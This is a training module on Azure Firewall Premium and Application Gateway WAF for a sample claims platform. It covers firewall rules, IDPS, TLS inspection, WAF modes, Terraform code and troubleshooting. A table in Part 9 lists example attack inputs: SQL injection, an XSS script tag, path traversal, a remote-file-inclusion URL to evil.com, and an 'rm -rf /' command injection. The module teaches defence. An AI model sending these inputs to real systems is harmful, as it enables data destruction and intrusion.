# Module 2a — Azure Firewall Premium and Application Gateway WAF
## Based on the Contoso Claims Platform

**Time to complete:** 2-3 hours
**Builds on:** Module 1 (VNets, subnets, NSGs, UDRs)

---

## What You Will Understand After This Module

- What Azure Firewall Premium actually does at a packet level
- The difference between network rules and application rules
- What IDPS is and why it matters for regulated workloads
- What WAF is and how it differs from the Firewall
- How App Gateway routes traffic internally
- Why both Firewall and WAF exist together and what each one catches
- How to read and write Firewall and WAF rules
- What happened in your platform when you deleted the Firewall

---

## Part 1 — Why a Firewall at All?

In Module 1 you learned that NSGs operate at Layer 4 — they allow or deny traffic based on IP address and port number. They cannot read what is inside a packet.

This is fine for many scenarios. But it is insufficient when:

1. You need to control **what external services your workloads can call** (e.g. only allow AKS nodes to download packages from Ubuntu mirrors, not from arbitrary internet addresses)
2. You need to **detect threats** — a port scan looks like normal TCP traffic at Layer 4
3. You need **centralised logging** of all network flows across all workloads
4. You need to **inspect encrypted traffic** — NSGs cannot decrypt HTTPS

Azure Firewall operates at Layer 7 (application layer). It understands HTTP, DNS, TLS, and other protocols. It can make decisions based on fully qualified domain names (FQDNs), not just IP addresses.

The fundamental difference:

```
NSG rule:    Allow TCP from 10.10.16.0/20 to any on port 443
             (allows AKS to call ANY HTTPS endpoint on the internet)

Firewall rule: Allow HTTPS from 10.10.16.0/20 to *.ubuntu.com
               (allows AKS to call only Ubuntu's servers on HTTPS)
```

The NSG rule is too permissive. A compromised pod could call any HTTPS endpoint. The Firewall rule is precise — only Ubuntu domains are allowed.

---

## Part 2 — Azure Firewall SKUs

Azure Firewall comes in three SKUs:

| Feature | Basic | Standard | Premium |
|---------|-------|----------|---------|
| Network rules | Yes | Yes | Yes |
| Application rules (FQDN) | Yes | Yes | Yes |
| Threat intelligence | Basic | Yes | Yes |
| IDPS | No | No | Yes |
| TLS inspection | No | No | Yes |
| Web categories | No | No | Yes |
| URL filtering | No | No | Yes |
| Approx cost | £300/mo | £800/mo | £1,200/mo |

**Your platform used Premium** because:
- IDPS is required for financial services threat detection
- TLS inspection is required to see inside encrypted traffic
- The cost is justified for a regulated workload

📖 [Azure Firewall SKU comparison](https://learn.microsoft.com/en-us/azure/firewall/choose-firewall-sku)

---

## Part 3 — Firewall Architecture in Your Platform

Your Firewall sits in the hub VNet at private IP `10.0.0.4`.

```
Hub VNet (10.0.0.0/16)
  └── AzureFirewallSubnet (10.0.0.0/26)
        └── fw-claims-hub-uks
              Private IP: 10.0.0.4
              Public IP:  pip-claims-hub-uks-fw
```

The Firewall has:
- A **private IP** (10.0.0.4) — this is where traffic from spokes arrives via UDR
- A **public IP** — this is where outbound traffic appears to originate (SNAT)
- A **Firewall Policy** (`fwpol-claims-hub-uks`) — a separate resource containing all the rules

**Why is the policy a separate resource?**

Decoupling the policy from the Firewall instance means you can:
- Use the same policy across multiple Firewalls (dev and prod share rules)
- Update rules without replacing the Firewall
- Apply Azure Policy to the Firewall Policy resource

📖 [Azure Firewall overview](https://learn.microsoft.com/en-us/azure/firewall/overview)
📖 [Azure Firewall Policy overview](https://learn.microsoft.com/en-us/azure/firewall/policy-overview)

---

## Part 4 — Firewall Rule Types

The Firewall processes three types of rules, evaluated in order:

### 1. DNAT Rules (Destination NAT)
Used to expose internal resources to the internet by translating inbound public IP:port to a private IP:port.

Example: expose a jump server on Firewall public IP port 2222 → private VM at 10.10.7.10 port 22.

Your platform has **0 DNAT rules** — nothing is exposed inbound through the Firewall. All inbound traffic enters via App Gateway instead.

### 2. Network Rules
Layer 4 rules. Allow or deny based on source IP, destination IP, protocol, and port.

Your platform's network rules:
```
Rule: allow-aks-internal
  Source:      10.10.16.0/20 (AKS subnet)
  Destination: AzureCloud.UKSouth (service tag)
  Protocol:    UDP
  Port:        1194
  Action:      Allow
```

This allows AKS nodes to communicate with Azure's AKS control plane over UDP 1194 (used for node bootstrapping and certificate management).

### 3. Application Rules
Layer 7 rules. Allow or deny based on FQDN (domain name), URL path, HTTP method, and web category. Only work for HTTP and HTTPS traffic.

Your platform's application rules:
```
Rule: allow-aks-fqdns
  Source:      10.10.16.0/20
  Target FQDNs: AzureKubernetesService (FQDN tag)
  Protocol:    HTTPS:443
  Action:      Allow

Rule: allow-ubuntu-packages  
  Source:      10.10.16.0/20
  Target FQDNs: *.ubuntu.com, *.snapcraft.io
  Protocol:    HTTP:80, HTTPS:443
  Action:      Allow

Rule: allow-azure-storage
  Source:      10.10.16.0/20
  Target FQDNs: *.blob.core.windows.net, *.table.core.windows.net
  Protocol:    HTTPS:443
  Action:      Allow
```

**What is an FQDN Tag?**

`AzureKubernetesService` is an FQDN tag — a Microsoft-maintained list of all FQDNs that AKS needs to function. Rather than maintaining your own list of Azure URLs, you use the tag and Microsoft keeps it updated. Similar to service tags for NSGs but for domain names.

📖 [Firewall rule processing logic](https://learn.microsoft.com/en-us/azure/firewall/rule-processing)
📖 [Azure Firewall FQDN tags](https://learn.microsoft.com/en-us/azure/firewall/fqdn-tags)
📖 [Azure Firewall application rules](https://learn.microsoft.com/en-us/azure/firewall/features#application-fqdn-filtering-rules)

---

## Part 5 — IDPS (Intrusion Detection and Prevention System)

IDPS is the most powerful Premium-only feature. It analyses network traffic and compares it against a database of 58,000+ threat signatures.

**What are signatures?**

A signature is a pattern that uniquely identifies a known attack or malicious behaviour. Examples:

- A sequence of bytes in a packet that matches a known exploit payload
- A DNS query to a domain known to be used for C2 (command and control)
- An HTTP request with headers that match a known web scanner
- A pattern of TCP flags that indicates a port scan
- Traffic patterns matching specific malware families (Emotet, Cobalt Strike, etc.)

Microsoft's threat intelligence team maintains these signatures and pushes updates continuously. You get protection against threats that were discovered yesterday.

**IDPS modes:**

| Mode | What happens when a signature matches |
|------|--------------------------------------|
| Off | No IDPS processing |
| Alert | Log the match, allow the traffic |
| Deny | Log the match, block the traffic |

Your platform used **Alert mode** — threats are logged but not blocked. For a production financial platform you would use **Deny mode** once you have tuned out false positives. Alert mode first lets you understand what legitimate traffic might accidentally match signatures.

**What lateral movement looks like to IDPS:**

```
Scenario: AKS pod compromised, attacker runs nmap scan

Attacker sends: TCP SYN to 10.10.5.4 port 22
                TCP SYN to 10.10.5.4 port 23
                TCP SYN to 10.10.5.4 port 25
                TCP SYN to 10.10.5.4 port 80
                (repeated rapidly across many ports)

IDPS signature: "TCP port scan from internal source"
IDPS action:    Alert (or Deny) + log to Log Analytics
Sentinel:       Creates incident, notifies security team
```

Without IDPS, this scan would be invisible in your NSG flow logs — all those TCP SYNs look like ordinary failed connections.

📖 [Azure Firewall Premium IDPS](https://learn.microsoft.com/en-us/azure/firewall/premium-features#idps)
📖 [Azure Firewall threat intelligence](https://learn.microsoft.com/en-us/azure/firewall/threat-intel)

---

## Part 6 — TLS Inspection

HTTPS encrypts the payload of HTTP requests. From the network's perspective, all HTTPS traffic looks identical — you can see the destination IP and port but not the URL path, headers, or body.

Without TLS inspection, an attacker inside your VNet can exfiltrate data by sending it as an encrypted HTTPS POST to an attacker-controlled server. The Firewall sees: source 192.168.x.x, destination evil.ru:443, HTTPS. No content inspection possible.

**How TLS inspection works:**

```
Pod → HTTPS request to external.com
    ↓
Firewall intercepts the connection
Firewall acts as a "man in the middle":
  - Terminates the TLS from the pod (pod sees Firewall's cert)
  - Decrypts the request
  - Inspects the content (URL, headers, body)
  - Re-encrypts
  - Forwards to external.com
    ↓
external.com ← encrypted connection from Firewall
```

For this to work without browser certificate warnings, the Firewall's CA certificate must be trusted by the clients (pods). In AKS, you add the certificate to the node's trusted certificate store.

**Your platform had TLS inspection disabled** — shown as "Disabled" in the screenshot of the Firewall. The reason: it adds operational complexity (certificate management, potential breaks in certificate pinning) and the private endpoint architecture means most sensitive traffic (OpenAI, Key Vault) stays inside Azure's network anyway and never passes through the Firewall.

In a production regulated deployment, TLS inspection would typically be enabled for internet-bound traffic.

📖 [Azure Firewall Premium TLS inspection](https://learn.microsoft.com/en-us/azure/firewall/premium-features#tls-inspection)
📖 [TLS inspection certificate management](https://learn.microsoft.com/en-us/azure/firewall/premium-certificates)

---

## Part 7 — What Happened When You Deleted the Firewall

This is a valuable real-world lesson. When the Firewall was deleted to save costs:

**Step 1 — The UDR stopped working:**
The route table on the AKS subnet said "send all traffic to 10.0.0.4 (VirtualAppliance)." But 10.0.0.4 no longer existed. Packets sent to that IP had nowhere to go — they were black-holed. AKS nodes temporarily lost internet connectivity.

**Step 2 — The route table had to be removed:**
Because the UDR was pointing to a non-existent IP, it had to be deleted too. This restored normal Azure routing — AKS traffic went directly to the internet without inspection.

**Step 3 — The Firewall Policy was cleaned up:**
The `azurerm_firewall_policy` resource and its rule collection group were removed from Terraform state. This was the Terraform cleanup work you did with `terraform state rm`.

**The lesson:** Security controls are interdependent. Deleting the Firewall without removing the UDR would have broken AKS networking. This is why infrastructure changes in production always need a runbook — a step-by-step procedure that accounts for dependencies.

---

## Part 8 — Application Gateway WAF

### What Application Gateway is

Application Gateway is a Layer 7 load balancer. It terminates HTTP/HTTPS connections and makes routing decisions based on URL paths, hostnames, and other HTTP properties.

It does two jobs in your platform:
1. **Load balancing** — distributes requests to the APIM backend
2. **WAF** — inspects every HTTP request for attack patterns before forwarding

It is the **only resource with a public IP** in your entire platform. Everything else is private.

### How App Gateway processes a request

```
Client → HTTPS request arrives at App Gateway public IP 4.158.34.10

Step 1 — Listener
  App Gateway has a listener on port 443 (HTTPS) and port 80 (HTTP)
  The listener accepts the connection and terminates TLS

Step 2 — WAF inspection
  WAF runs OWASP Core Rule Set 3.2 against the request
  Checks: SQL injection, XSS, path traversal, command injection, etc.
  If a rule fires in Prevention mode: return 403, log the block
  If a rule fires in Detection mode: log the event, allow the request

Step 3 — Request routing rule
  App Gateway checks routing rules to determine the backend
  Your rule: all requests → backend pool "bepool-apim"

Step 4 — Backend pool
  bepool-apim contains one address: 10.10.5.4 (APIM private IP)
  App Gateway health-probes this address to confirm it is healthy

Step 5 — Backend HTTP settings
  Defines how App Gateway connects to the backend
  Protocol: HTTP (not HTTPS — internal traffic uses HTTP)
  Port: 80
  Path override: /

Step 6 — Forward request
  App Gateway sends the request to 10.10.5.4:80
  Original client IP is preserved in the X-Forwarded-For header
```

📖 [Application Gateway overview](https://learn.microsoft.com/en-us/azure/application-gateway/overview)
📖 [Application Gateway components](https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-components)
📖 [Application Gateway request routing rules](https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-request-routing-rules)

---

## Part 9 — WAF Deep Dive

### What OWASP is

OWASP (Open Web Application Security Project) is a non-profit that publishes the Top 10 web application vulnerabilities. The Azure WAF uses the OWASP Core Rule Set (CRS) — a set of rules that detect these attacks.

**OWASP Top 10 (the ones WAF protects against):**

| Attack | Example | How WAF catches it |
|--------|---------|-------------------|
| SQL Injection | `'; DROP TABLE claims; --` | Matches SQL keywords in unexpected places |
| XSS | `<script>stealCookies()</script>` | Matches script tags and event handlers |
| Path Traversal | `../../etc/passwd` | Matches `../` sequences |
| Remote File Inclusion | `?file=http://evil.com/shell.php` | Matches external URL in parameters |
| Command Injection | `; rm -rf /` | Matches shell command characters |
| Protocol Attacks | Malformed HTTP headers | Matches against HTTP spec violations |

### WAF Modes

**Detection mode:** WAF inspects all requests and logs matches, but allows everything through. Use this when:
- First deploying WAF (to find false positives before blocking legitimate traffic)
- Running load tests (Azure Load Testing IPs sometimes match WAF rules)
- Troubleshooting — if your API suddenly breaks, switch to Detection to see if WAF is blocking

**Prevention mode:** WAF blocks requests that match rules and returns 403. Use this in production.

Your platform ran in **Detection mode during load tests** — this is why. In Prevention mode, the Azure Load Testing service IPs triggered WAF rules and the requests were blocked, giving a false error rate.

### WAF Rule Groups and Custom Rules

The CRS is organised into rule groups:

```
REQUEST-911-METHOD-ENFORCEMENT     (block unusual HTTP methods)
REQUEST-913-SCANNER-DETECTION     (block known web scanners)
REQUEST-920-PROTOCOL-ENFORCEMENT  (enforce HTTP spec compliance)
REQUEST-921-PROTOCOL-ATTACK       (HTTP request smuggling, etc.)
REQUEST-930-APPLICATION-ATTACK-LFI (local file inclusion)
REQUEST-931-APPLICATION-ATTACK-RFI (remote file inclusion)
REQUEST-932-APPLICATION-ATTACK-RCE (remote code execution)
REQUEST-933-APPLICATION-ATTACK-PHP (PHP-specific attacks)
REQUEST-941-APPLICATION-ATTACK-XSS (cross-site scripting)
REQUEST-942-APPLICATION-ATTACK-SQLI (SQL injection)
REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION
REQUEST-944-APPLICATION-ATTACK-JAVA
```

You can disable individual rules within groups if they cause false positives. For example, rule 942440 (detects SQL comment sequences) might fire on a claims description that includes "--" as a dash. You would add a rule exclusion rather than disabling the entire SQL injection rule group.

**Custom rules** let you add your own blocking logic:
- Block requests from specific IP ranges (e.g. known bad actors)
- Rate limit specific paths (e.g. max 10 requests per minute to `/analyse`)
- Block requests with specific headers or query string values

📖 [Azure WAF on Application Gateway](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/ag-overview)
📖 [OWASP CRS rule groups](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-crs-rulegroups-rules)
📖 [WAF custom rules](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/custom-waf-rules-overview)
📖 [WAF exclusion lists](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-configuration)

---

## Part 10 — Zone Redundancy in App Gateway v2

The v2 SKU of Application Gateway supports availability zones. Your platform deployed App Gateway across zones 1, 2, and 3 in UK South.

What this means:

```
UK South has 3 physical data centres (zones 1, 2, 3)
App Gateway v2 deploys instances across all three zones

Zone 1 data centre fails
  → App Gateway instances in zones 2 and 3 continue serving traffic
  → No downtime, no manual failover required
```

This is different from regional redundancy (two separate Azure regions). Zone redundancy protects against a single data centre failure within one region. Regional redundancy protects against an entire region going offline.

For most financial services workloads, zone redundancy meets the availability requirement. Regional redundancy is reserved for critical systems with very high RTO (recovery time objective) requirements.

📖 [Application Gateway v2 autoscaling and zone redundancy](https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-autoscaling-zone-redundant)
📖 [Azure availability zones](https://learn.microsoft.com/en-us/azure/reliability/availability-zones-overview)

---

## Part 11 — How Firewall and WAF Relate to Each Other

This is the question from Module 1 answers — why both? Here is the precise division of responsibility:

```
INTERNET
    │
    ▼
[App Gateway WAF]
    │
    Catches: SQL injection, XSS, path traversal, web scanners,
             HTTP protocol attacks, OWASP Top 10
    Does NOT catch: outbound threats, lateral movement,
                    non-HTTP protocols, C2 callbacks
    │
    ▼
[APIM] → [AKS]
              │
              │ (outbound traffic hits UDR)
              │
              ▼
          [Azure Firewall Premium]
              │
              Catches: C2 callbacks, port scans, lateral movement,
                       protocol anomalies, threat intelligence matches,
                       FQDN-based egress control
              Does NOT catch: inbound HTTP attacks (WAF's job),
                              traffic that doesn't pass through the hub
```

The WAF is an **inbound specialist** — it knows HTTP deeply and catches application-layer attacks on incoming requests.

The Firewall is an **outbound and east-west generalist** — it catches threats that have already gotten inside, trying to phone home or move laterally.

Neither one alone is sufficient. Together they provide defence in depth across both the entry point and the exit point.

---

## Part 12 — Reading Your Terraform Firewall and WAF Code

### Firewall in Terraform

In `infra/modules/firewall/main.tf`:

```hcl
resource "azurerm_firewall" "this" {
  name                = "fw-${var.name}"
  location            = var.location
  resource_group_name = var.resource_group_name
  sku_name            = "AZFW_VNet"
  sku_tier            = "Premium"          # Premium for IDPS and TLS inspection
  firewall_policy_id  = azurerm_firewall_policy.this.id

  ip_configuration {
    name                 = "configuration"
    subnet_id            = var.firewall_subnet_id
    public_ip_address_id = azurerm_public_ip.firewall.id
  }
}
```

`sku_tier = "Premium"` — this is what enables IDPS, TLS inspection, and web categories.

`firewall_policy_id` — links to the separate policy resource containing all rules. If you change rules, you update the policy. The Firewall resource itself rarely changes.

### Application Rules in Terraform

```hcl
resource "azurerm_firewall_policy_rule_collection_group" "default" {
  name               = "rcg-default"
  firewall_policy_id = azurerm_firewall_policy.this.id
  priority           = 100

  application_rule_collection {
    name     = "arc-aks-egress"
    priority = 100
    action   = "Allow"

    rule {
      name = "allow-aks-fqdns"
      source_addresses = ["10.10.16.0/20"]
      protocols {
        type = "Https"
        port = 443
      }
      destination_fqdn_tags = ["AzureKubernetesService"]
    }
  }
}
```

### App Gateway WAF in Terraform

In `infra/modules/app_gateway/main.tf`, the WAF policy is a separate resource:

```hcl
resource "azurerm_web_application_firewall_policy" "this" {
  name                = "wafpol-${var.name}"
  resource_group_name = var.resource_group_name
  location            = var.location

  policy_settings {
    enabled                     = true
    mode                        = "Prevention"   # or "Detection"
    request_body_check          = true
    max_request_body_size_in_kb = 128
  }

  managed_rules {
    managed_rule_set {
      type    = "OWASP"
      version = "3.2"
    }
  }
}
```

The `mode = "Prevention"` is the key setting. Changing it to `"Detection"` is how you switch WAF to logging-only mode — useful for load tests and troubleshooting.

📖 [azurerm_firewall Terraform resource](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/firewall)
📖 [azurerm_firewall_policy Terraform resource](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/firewall_policy)
📖 [azurerm_web_application_firewall_policy Terraform resource](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/web_application_firewall_policy)
📖 [azurerm_application_gateway Terraform resource](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/application_gateway)

---

## Part 13 — Troubleshooting Firewall and WAF Issues

These are the real problems you hit when working with these services. Understanding failure modes deepens your understanding of how the technology works.

### Firewall blocks legitimate traffic

**Symptom:** AKS pods cannot pull images from ACR, or cannot reach Azure APIs.

**Diagnosis:**
```bash
# Check Firewall logs in Log Analytics
# Look for deny entries from your AKS subnet
AzureDiagnostics
| where ResourceType == "AZUREFIREWALLS"
| where msg_s contains "Deny"
| where msg_s contains "10.10.16"
| project TimeGenerated, msg_s
| order by TimeGenerated desc
```

**Fix:** Add an application rule allowing the blocked FQDN, or add it to the `AzureKubernetesService` FQDN tag if it is an AKS dependency.

### WAF blocks legitimate API requests

**Symptom:** API returns 403 for some requests but not others. Happens more with complex claim descriptions.

**Diagnosis:**
```bash
# Check WAF logs
AzureDiagnostics
| where ResourceType == "APPLICATIONGATEWAYS"
| where OperationName == "ApplicationGatewayFirewall"
| where action_s == "Blocked"
| project TimeGenerated, ruleId_s, message_s, requestUri_s
```

**Fix options:**
1. Switch WAF to Detection mode temporarily to confirm WAF is the cause
2. Add a rule exclusion for the specific rule ID that fired
3. Add a custom rule to allow the specific request pattern

### App Gateway shows backend as Unhealthy

**Symptom:** App Gateway health probe page shows APIM at 10.10.5.4 as Unhealthy.

**Common causes:**
- APIM is still provisioning (APIM takes 30-45 minutes to deploy)
- NSG on the APIM subnet is blocking port 3443 from ApiManagement service tag
- Health probe path is wrong (should be `/` which returns 404 — that is acceptable)
- APIM is in a failed state

**Diagnosis:** Check the health probe result detail — it shows the HTTP status code returned. A 404 is healthy. A connection timeout means the probe cannot reach APIM at all.

---

## Summary

| Concept | Your Platform | Key Point |
|---------|--------------|-----------|
| Azure Firewall | `fw-claims-hub-uks`, 10.0.0.4 | Premium SKU for IDPS and TLS inspection |
| Firewall Policy | `fwpol-claims-hub-uks` | Separate resource — rules decoupled from instance |
| Network rules | AKS → AzureCloud UDP 1194 | Layer 4, IP + port based |
| Application rules | AKS → AzureKubernetesService, Ubuntu, Storage | Layer 7, FQDN based |
| IDPS | Alert mode | 58,000+ signatures, detect lateral movement |
| TLS inspection | Disabled | Adds operational complexity, not needed with private endpoints |
| App Gateway | Public IP 4.158.34.10, zone redundant | Only public-facing resource |
| WAF | OWASP CRS 3.2, Detection mode for load tests | Inbound HTTP attack prevention |
| WAF modes | Detection (log only) vs Prevention (block) | Switch to Detection for troubleshooting |

---

## Documentation Reference

📖 [Azure Firewall documentation hub](https://learn.microsoft.com/en-us/azure/firewall/)
📖 [Azure Firewall Premium features](https://learn.microsoft.com/en-us/azure/firewall/premium-features)
📖 [Azure Firewall IDPS](https://learn.microsoft.com/en-us/azure/firewall/premium-features#idps)
📖 [Azure Firewall TLS inspection](https://learn.microsoft.com/en-us/azure/firewall/premium-features#tls-inspection)
📖 [Azure Firewall rule processing](https://learn.microsoft.com/en-us/azure/firewall/rule-processing)
📖 [Azure Firewall FQDN tags](https://learn.microsoft.com/en-us/azure/firewall/fqdn-tags)
📖 [Azure Firewall threat intelligence](https://learn.microsoft.com/en-us/azure/firewall/threat-intel)
📖 [Application Gateway overview](https://learn.microsoft.com/en-us/azure/application-gateway/overview)
📖 [Application Gateway WAF](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/ag-overview)
📖 [OWASP CRS rule groups](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-crs-rulegroups-rules)
📖 [WAF custom rules](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/custom-waf-rules-overview)
📖 [WAF exclusion lists](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-configuration)
📖 [App Gateway v2 zone redundancy](https://learn.microsoft.com/en-us/azure/application-gateway/application-gateway-autoscaling-zone-redundant)
📖 [Azure availability zones](https://learn.microsoft.com/en-us/azure/reliability/availability-zones-overview)
📖 [azurerm_firewall Terraform](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/firewall)
📖 [azurerm_web_application_firewall_policy Terraform](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/web_application_firewall_policy)

---

## AZ-305 Exam Alignment

This module maps to:
**Domain 4: Design Infrastructure Solutions (35-40%)**
- Design network security solutions
- Design solutions for network connectivity

📖 [AZ-305 exam skills outline](https://learn.microsoft.com/en-us/credentials/certifications/exams/az-305/)
📖 [Design network security — study guide](https://learn.microsoft.com/en-us/azure/architecture/framework/security/design-network)
📖 [Azure Firewall vs WAF — when to use each](https://learn.microsoft.com/en-us/azure/architecture/example-scenario/gateway/firewall-application-gateway)

---

*Next: Module 2b — APIM, Workload Identity, and Private Endpoints*
